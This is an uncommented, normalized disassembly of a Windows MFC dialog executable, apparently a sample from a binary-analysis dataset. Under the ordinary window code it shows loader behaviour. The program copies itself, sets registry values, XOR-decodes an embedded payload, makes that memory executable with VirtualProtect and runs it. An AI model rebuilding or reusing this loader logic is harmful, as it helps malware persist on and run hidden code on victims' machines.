sub_401130
push 0xffffffff
push sub_4021c3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push 0x0
mov [ esp + 0x8 ] esi
call Ordinal_MFC42_561
push 0x730
mov [ esp + 0x18 ] 0x0
mov [ esi ] r--data
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x14 ] 0x1
je r-xdata
xor eax eax
mov ecx eax
call sub_401960
jmp r-xdata
mov ecx eax
mov [ esp + 0x14 ] 0x0
call sub_4019b0
sub_401220
push 0xffffffff
push sub_4021f1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xec
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_1134
add esp 0x4
mov ecx esi
call Ordinal_MFC42_2621
push 0x0
lea ecx [ esp + 0x8 ]
call sub_4013a0
lea eax [ esp + 0x4 ]
lea ecx [ esp + 0x4 ]
mov [ esp + 0xf8 ] 0x0
mov [ esi + 0x20 ] eax
call Ordinal_MFC42_2514
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xf8 ] 0x2
call sub_401040
lea ecx [ esp + 0x64 ]
mov [ esp + 0xf8 ] 0x1
call sub_401040
lea ecx [ esp + 0x4 ]
mov [ esp + 0xf8 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0xf0 ]
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xf8
retn
sub_4012d0
push 0xffffffff
push sub_402213
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x10 ] 0x1
call sub_401040
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x0
call sub_401040
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4013a0
push 0xffffffff
push sub_402241
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
push 0x66
mov [ esp + 0xc ] esi
call Ordinal_MFC42_324
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x0
call sub_401000
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x10 ] 0x1
call sub_401000
mov [ esp + 0x10 ] 0x2
mov [ esi ] r--data
call Ordinal_MFC42_1168
push 0x80
push 0xe
push 0x80
call Ordinal_MFC42_1146
push eax
call [ LoadIconA@IAT ]
mov ecx [ esp + 0x8 ]
mov [ esi + 0xe8 ] eax
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_401450
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x60 ]
push eax
push 0x3e9
push edi
call Ordinal_MFC42_2302
add esi 0xa4
push esi
push 0x3e8
push edi
call Ordinal_MFC42_2302
pop edi
pop esi
retn 0x4
sub_4014a0
push 0xffffffff
push sub_402258
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov esi ecx
call Ordinal_MFC42_4710
mov eax [ esi + 0x20 ]
push 0x0
push eax
call [ GetSystemMenu@IAT ]
push eax
call Ordinal_MFC42_2863
mov edi eax
test edi edi
je r-xdata
mov edx [ esi + 0xe8 ]
mov eax [ esi + 0x20 ]
mov edi [ SendMessageA@IAT ]
push edx
push 0x1
push 0x80
push eax
call edi
mov ecx [ esi + 0xe8 ]
mov edx [ esi + 0x20 ]
push ecx
push 0x0
push 0x80
push edx
call edi
lea ecx [ esi + 0xa4 ]
lea eax [ esi + 0x60 ]
mov [ esi + 0xa0 ] ecx
mov ecx [ esp + 0xc ]
mov [ esi + 0xe4 ] eax
pop edi
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_540
push 0x65
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call Ordinal_MFC42_4160
mov ecx [ esp + 0x8 ]
mov eax [ ecx - 0x8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x14 ] 0xffffffff
call Ordinal_MFC42_800
mov edx [ edi + 0x4 ]
push ebx
mov ebx [ AppendMenuA@IAT ]
push 0x0
push 0x0
push 0x800
push edx
call ebx
mov eax [ esp + 0xc ]
mov ecx [ edi + 0x4 ]
push eax
push 0x10
push 0x0
push ecx
call ebx
pop ebx
sub_401590
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_402278
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
and eax 0xfff0
sub esp 0x60
cmp eax 0x10
jne r-xdata
call Ordinal_MFC42_2379
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x8
lea ecx [ esp ]
call sub_401330
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x8
sub_401610
sub esp 0x64
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push eax
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov ecx esi
call Ordinal_MFC42_2379
pop esi
add esp 0x64
retn
push ebx
push edi
push esi
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_470
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
mov ecx [ esi + 0x20 ]
push 0x0
neg eax
sbb eax eax
and eax edi
push eax
push 0x27
push ecx
call [ SendMessageA@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0xb
call edi
push 0xc
mov ebx eax
call edi
mov edi eax
mov eax [ esi + 0x20 ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0xe8 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
sub eax ecx
sub eax edi
inc eax
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
push eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax ebx
inc eax
cdq
sub eax edx
mov edx [ esp + 0x28 ]
sar eax 0x1
push eax
push edx
call [ DrawIcon@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_755
pop edi
pop ebx
pop esi
add esp 0x64
retn
sub_401740
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ lstrcpynA@IAT ]
push 0x104
lea ecx [ esi + 0x104 ]
push eax
push ecx
call edi
mov edx [ esp + 0xc ]
push 0x104
push edx
push esi
call edi
pop edi
mov eax 0x1
pop esi
retn 0x8
sub_401780
sub esp 0x210
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x11c ]
push 0x104
push eax
mov ebp ecx
push 0x0
mov [ esp + 0x1c ] 0x0
call [ GetModuleFileNameA@IAT ]
lea esi [ ebp + 0x104 ]
push 0x0
lea ecx [ esp + 0x120 ]
push esi
push ecx
call [ CopyFileA@IAT ]
mov edi [ lstrlenA@IAT ]
test eax eax
jne r-xdata
mov ebx [ RegCreateKeyA@IAT ]
lea edx [ esp + 0x10 ]
push edx
push rw-data
push 0x80000002
call ebx
lea eax [ esp + 0x10 ]
mov [ esp + 0x14 ] 0x0
push eax
push rw-data
push 0x80000001
call ebx
test eax eax
jne r-xdata
lea edx [ esp + 0x18 ]
push 0x104
push edx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
mov ebx [ lstrcatA@IAT ]
lea eax [ esp + 0x18 ]
push rw-data
push eax
call ebx
lea ecx [ esp + 0x18 ]
push ebp
push ecx
call ebx
lea edx [ esp + 0x18 ]
push rw-data
push edx
call ebx
lea eax [ esp + 0x18 ]
push rw-data
push eax
call ebx
lea ecx [ esp + 0x18 ]
push 0x0
lea edx [ esp + 0x120 ]
push ecx
push edx
call [ CopyFileA@IAT ]
lea eax [ esp + 0x18 ]
push eax
call edi
inc eax
lea ecx [ esp + 0x18 ]
push eax
push ecx
push esi
call [ lstrcpynA@IAT ]
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x210
retn
mov ebx [ RegSetValueExA@IAT ]
push ebp
call edi
test eax eax
push esi
jg r-xdata
call edi
mov edx [ esp + 0x10 ]
push eax
push esi
push 0x1
push 0x0
push ebp
push edx
call edi
mov ecx [ esp + 0x10 ]
push eax
push esi
push 0x1
push 0x0
push 0x0
push ecx
jmp r-xdata
cmp [ esp + 0x14 ] 0xa
jge r-xdata
call ebx
mov edx [ esp + 0x14 ]
inc edx
test eax eax
mov [ esp + 0x14 ] edx
je r-xdata
sub_401960
push esi
push edi
mov esi ecx
call sub_401910
mov edi [ lstrcpyA@IAT ]
mov eax 0x1
mov [ esi ] al
mov [ esi + 0x10c ] eax
mov [ esi + 0x110 ] eax
lea eax [ esi + 0x114 ]
push rw-data
push eax
mov [ esi + 0x31c ] 0x0
call edi
lea ecx [ esi + 0x218 ]
push rw-data
push ecx
call edi
mov eax esi
pop edi
pop esi
retn
sub_4019b0
push 0xffffffff
push sub_40229b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov ebp ecx
push 0x730
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x10 ] eax
xor ebx ebx
cmp eax ebx
mov [ esp + 0x20 ] ebx
je r-xdata
mov ecx 0x1cc
mov esi ebp
mov edi ebx
mov [ esp + 0x20 ] 0xffffffff
[ edi ] [ esi ]
mov eax [ ebp + 0x110 ]
test eax eax
je r-xdata
mov ecx eax
call sub_401b60
mov ebx eax
mov eax [ ebp + 0x31c ]
test eax eax
je r-xdata
lea eax [ ebp + 0x218 ]
lea ecx [ ebp + 0x114 ]
push eax
push ecx
mov ecx rw-data
call sub_401740
mov ecx rw-data
call sub_401780
push 0x0
push 0x186d
push rw-data
mov ecx ebx
call sub_401b80
push eax
call Ordinal_MFC42_823
add esp 0x4
mov edi eax
mov ecx ebx
push edi
push 0x186d
push rw-data
call sub_401b80
test ebx ebx
mov esi eax
je r-xdata
lea edx [ ebp + 0x62c ]
lea eax [ ebp + 0x528 ]
push edx
add ebp 0x320
push eax
push ebp
mov ecx rw-data
call sub_401ca0
mov ecx rw-data
call sub_401d20
lea ecx [ esp + 0x14 ]
push ecx
push 0x40
push esi
push edi
call [ VirtualProtect@IAT ]
call edi
mov esi [ Sleep@IAT ]
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push edi
call Ordinal_MFC42_825
add esp 0x4
push 0x0
call [ exit@IAT ]
mov ecx ebx
call j_sub_401d30
push ebx
call Ordinal_MFC42_825
add esp 0x4
sub_401b80
mov eax [ esp + 0x4 ]
mov edx ecx
push ebx
push ebp
mov ecx [ eax ]
push esi
mov [ edx + 0x108 ] ecx
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov ebp ecx
push edi
add esi eax
lea edi [ edx + 0x1 ]
mov ebx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0xc ]
mov ecx [ edx + 0x10c ]
mov ebx [ ebx + 0x8 ]
add eax edi
dec ecx
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ esp + 0x1c ]
push ecx
push ebx
push eax
mov ecx edx
call sub_401be0
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_401be0
push esi
push edi
mov edi ecx
mov ecx [ esp + 0x14 ]
mov esi [ edi + 0x108 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x10 ]
push ebx
xor ebx ebx
test edx edx
jbe r-xdata
mov eax [ esp + 0x10 ]
pop edi
add eax esi
pop esi
retn 0xc
pop ebx
pop edi
mov eax edx
pop esi
retn 0xc
push ebp
mov ebp [ esp + 0x14 ]
sub ebp ecx
lea eax [ edx - 0x14 ]
cmp ebx eax
jbe r-xdata
add ecx ebx
inc ebx
cmp ebx edx
jb r-xdata
push ecx
push rw-data
call [ printf@IAT ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
add esp 0x8
mov dl [ edi + eax + 0x1 ]
xor dl [ ecx + ebp ]
inc eax
cmp eax esi
mov [ ecx ] dl
jl r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
xor eax eax
test esi esi
jle r-xdata
pop ebp
sub_401ca0
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ lstrcpynA@IAT ]
mov esi ecx
push 0x104
push eax
push esi
call edi
mov ecx [ esp + 0x10 ]
push 0x104
lea edx [ esi + 0x104 ]
push ecx
push edx
call edi
mov eax [ esp + 0x14 ]
push 0x104
lea ecx [ esi + 0x208 ]
push eax
push ecx
call edi
xor eax eax
mov ecx 0x1
mov [ esi + 0x314 ] eax
mov [ esi + 0x318 ] 0x10
mov [ esi + 0x31c ] ecx
mov [ esi + 0x320 ] ecx
mov [ esi + 0x324 ] eax
mov [ esi + 0x328 ] eax
mov [ esi + 0x32c ] eax
mov [ esi + 0x330 ] eax
pop edi
pop esi
retn 0xc
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_402145
cmp [ rw-data ] ebx
jne r-xdata
call sub_402130
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402142
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_402152
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40216a
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401020
push esi
mov esi ecx
call sub_401040
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401050
mov eax [ Ordinal_MFC42_4275@IAT ]
retn
sub_401060
mov eax r--data
retn
sub_401070
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_6215
mov ecx [ esi + 0x40 ]
push 0x5
call Ordinal_MFC42_6215
mov ecx esi
call Ordinal_MFC42_2379
pop esi
retn 0xc
sub_401090
retn
sub_4010a0
retn 0x4
sub_4010b0
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_4010c0
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_4010d0
call sub_4010e0
jmp sub_4010f0
sub_4010e0
mov ecx rw-data
jmp sub_401910
sub_4010f0
push sub_401100
call sub_401fa6
pop ecx
retn
sub_401100
mov ecx rw-data
jmp sub_401d30
sub_401110
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_401120
mov eax r--data
retn
sub_4011b0
push esi
mov esi ecx
call sub_4011d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4011d0
jmp Ordinal_MFC42_815
sub_4011e0
call sub_4011f0
sub_4011f0
mov ecx rw-data
jmp sub_401130
sub_401200
push sub_401210
call sub_401fa6
pop ecx
retn
sub_401210
mov ecx rw-data
jmp sub_4011d0
sub_401330
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401350
push esi
mov esi ecx
call sub_401370
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401370
jmp Ordinal_MFC42_641
sub_401380
retn 0x4
sub_401390
mov eax r--data
retn
sub_401430
push esi
mov esi ecx
call sub_4012d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401480
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_401490
mov eax r--data
retn
sub_4016d0
mov eax [ ecx + 0xe8 ]
retn
sub_4016e0
call sub_4016f0
jmp sub_401700
sub_4016f0
mov ecx rw-data
jmp sub_401720
sub_401700
push sub_401710
call sub_401fa6
pop ecx
retn
sub_401710
mov ecx rw-data
jmp sub_401d30
sub_401720
push esi
mov esi ecx
push 0x104
lea eax [ esi + 0x104 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
mov eax esi
pop esi
retn
sub_4018d0
call sub_4018e0
jmp sub_4018f0
sub_4018e0
mov ecx rw-data
jmp sub_401910
sub_4018f0
push sub_401900
call sub_401fa6
pop ecx
retn
sub_401900
mov ecx rw-data
jmp sub_401d30
sub_401910
mov eax ecx
retn
sub_401920
call sub_401930
jmp sub_401940
sub_401930
mov ecx rw-data
jmp sub_401910
sub_401940
push sub_401950
call sub_401fa6
pop ecx
retn
sub_401950
mov ecx rw-data
jmp sub_401d30
sub_401b30
mov ecx rw-data
jmp sub_401910
sub_401b40
push sub_401b50
call sub_401fa6
pop ecx
retn
sub_401b50
mov ecx rw-data
jmp sub_401d30
sub_401b60
push esi
mov esi ecx
call sub_401910
mov eax esi
pop esi
retn
j_sub_401d30
jmp sub_401d30
sub_401c60
call sub_401c70
jmp sub_401c80
sub_401c70
mov ecx rw-data
jmp sub_401910
sub_401c80
push sub_401c90
call sub_401fa6
pop ecx
retn
sub_401c90
mov ecx rw-data
jmp sub_401d30
sub_401d20
xor eax eax
retn
sub_401d30
retn
Ordinal_MFC42_2575
jmp [ Ordinal_MFC42_2575@IAT ]
Ordinal_MFC42_6055
jmp [ Ordinal_MFC42_6055@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1776
jmp [ Ordinal_MFC42_1776@IAT ]
Ordinal_MFC42_4396
jmp [ Ordinal_MFC42_4396@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5290
jmp [ Ordinal_MFC42_5290@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3574
jmp [ Ordinal_MFC42_3574@IAT ]
Ordinal_MFC42_567
jmp [ Ordinal_MFC42_567@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_609
jmp [ Ordinal_MFC42_609@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_4673
jmp [ Ordinal_MFC42_4673@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_1146
jmp [ Ordinal_MFC42_1146@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
Ordinal_MFC42_2302
jmp [ Ordinal_MFC42_2302@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_4160
jmp [ Ordinal_MFC42_4160@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_2863
jmp [ Ordinal_MFC42_2863@IAT ]
Ordinal_MFC42_755
jmp [ Ordinal_MFC42_755@IAT ]
Ordinal_MFC42_470
jmp [ Ordinal_MFC42_470@IAT ]
sub_401f7a
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_401fa6
push [ esp + 0x4 ]
call sub_401f7a
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402130
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402142
xor eax eax
retn
sub_402145
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_402152
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_402198
jmp sub_402198
sub_402198
push 0x600
push 0x0
call sub_40216a
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
sub_4021b0
mov ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_815
sub_4021b8
mov eax [ ebp - 0x10 ]
push eax
call Ordinal_MFC42_825
pop ecx
retn
sub_4021c3
mov eax r--data
jmp __CxxFrameHandler
sub_4021d0
lea ecx [ ebp - 0xf8 ]
jmp sub_4012d0
sub_4021db
lea ecx [ ebp - 0xf8 ]
jmp Ordinal_MFC42_641
sub_4021e6
lea ecx [ ebp - 0x98 ]
jmp sub_401040
sub_4021f1
mov eax r--data
jmp __CxxFrameHandler
sub_402200
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_641
sub_402208
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp sub_401040
sub_402213
mov eax r--data
jmp __CxxFrameHandler
sub_402220
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_641
sub_402228
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp sub_401040
sub_402233
mov ecx [ ebp - 0x10 ]
add ecx 0xa4
jmp sub_401040
sub_402241
mov eax r--data
jmp __CxxFrameHandler
sub_402250
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_402258
mov eax r--data
jmp __CxxFrameHandler
sub_402270
lea ecx [ ebp - 0x6c ]
jmp sub_401370
sub_402278
mov eax r--data
jmp __CxxFrameHandler
sub_402290
mov eax [ ebp - 0x14 ]
push eax
call Ordinal_MFC42_825
pop ecx
